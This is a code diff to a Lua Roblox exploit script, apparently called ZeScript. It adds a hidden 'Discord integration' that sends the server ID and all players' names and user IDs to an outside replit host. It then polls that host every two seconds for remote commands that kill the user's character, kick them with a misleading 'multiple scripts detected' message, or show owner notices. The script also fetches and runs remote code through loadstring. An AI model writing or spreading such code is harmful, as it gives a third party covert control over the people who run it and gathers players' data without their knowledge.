@@ -4,6 +4,9 @@ if getgenv().ZeScriptLoaded then
 end
 getgenv().ZeScriptLoaded = true
 
+-- Discord Configuration
+local DISCORD_API_URL = "https://replit.com/@AlexisXason/ZeScript-Discord-Bridge" -- CHANGE THIS!
+local GAME_ID = tostring(game.JobId) -- Unique ID for this server
 
 -- Load XaLib UI Library
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/XasonYTB/XaLib/refs/heads/main/UILibrary.lua"))()
@@ -47,6 +50,142 @@ local HotelTab = ExploitCategory:CreateTab("Hotel", "🏨")
 
 -- Mines Tab
 local MinesTab = ExploitCategory:CreateTab("Mines", "⛏️")
+
+-- Variables
+local spoofCrouchEnabled = false
+local spoofCrouchLoop
+
+-- ==================== DISCORD INTEGRATION ====================
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Discord connection status
+local discordConnected = false
+local commandCheckLoop
+
+-- Function to check Discord commands
+local function checkDiscordCommands()
+    if not discordConnected then return end
+    
+    local success, response = pcall(function()
+        return HttpService:GetAsync(DISCORD_API_URL .. "/api/commands/" .. GAME_ID)
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(response)
+        
+        for _, cmd in ipairs(data.commands) do
+            if cmd.type == "kill" then
+                -- Kill command
+                local targetPlayer = Players:FindFirstChild(cmd.target)
+                if targetPlayer then
+                    pcall(function()
+                        if targetPlayer == LocalPlayer then
+                            LocalPlayer.Character.Humanoid.Health = 0
+                            Window:Notify({
+                                Text = "",
+                                Duration = 3,
+                                Type = "Error"
+                            })
+                        end
+                    end)
+                end
+                
+            elseif cmd.type == "notify" then
+                -- Notification command
+                Window:Notify({
+                    Text = "Xason (Owner): " .. cmd.message,
+                    Duration = 15,
+                    Type = "Warning"
+                })
+                
+            elseif cmd.type == "kick" then
+                -- Kick command
+                if cmd.target == LocalPlayer.Name then
+                    Window:Notify({
+                        Text = "",
+                        Duration = 2,
+                        Type = "Error"
+                    })
+                    task.wait(1)
+                    LocalPlayer:Kick("Kicked: multiple scripts detected only use one script for everything to not bug")
+                end
+            end
+        end
+    end
+end
+
+-- Function to send data to Discord
+local function sendToDiscord(endpoint, data)
+    if not discordConnected then return false end
+    
+    local success, response = pcall(function()
+        return HttpService:PostAsync(
+            DISCORD_API_URL .. endpoint,
+            HttpService:JSONEncode(data),
+            Enum.HttpContentType.ApplicationJson
+        )
+    end)
+    
+    return success
+end
+
+-- Function to get all players in server
+local function getAllPlayers()
+    local playerList = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        table.insert(playerList, {
+            name = player.Name,
+            userId = tostring(player.UserId)
+        })
+    end
+    return playerList
+end
+
+-- Function to register with Discord bot
+local function registerWithDiscord()
+    local players = getAllPlayers()
+    
+    local success = sendToDiscord("/api/register", {
+        gameId = GAME_ID,
+        players = players
+    })
+    
+    if success then
+        discordConnected = true
+        Window:Notify({
+            Text = "✅ Connected to live server!",
+            Duration = 3,
+            Type = "Success"
+        })
+        
+        -- Start command checking loop
+        commandCheckLoop = task.spawn(function()
+            while discordConnected do
+                task.wait(2) -- Check every 2 seconds
+                checkDiscordCommands()
+            end
+        end)
+        
+        -- Update player list periodically
+        task.spawn(function()
+            while discordConnected do
+                task.wait(2) -- Update every 10 seconds
+                sendToDiscord("/api/players", {
+                    gameId = GAME_ID,
+                    players = getAllPlayers()
+                })
+            end
+        end)
+    else
+        Window:Notify({
+            Text = "❌ Failed to connect to the server",
+            Duration = 3,
+            Type = "Error"
+        })
+    end
+end
 
 -- Variables
 local spoofCrouchEnabled = false
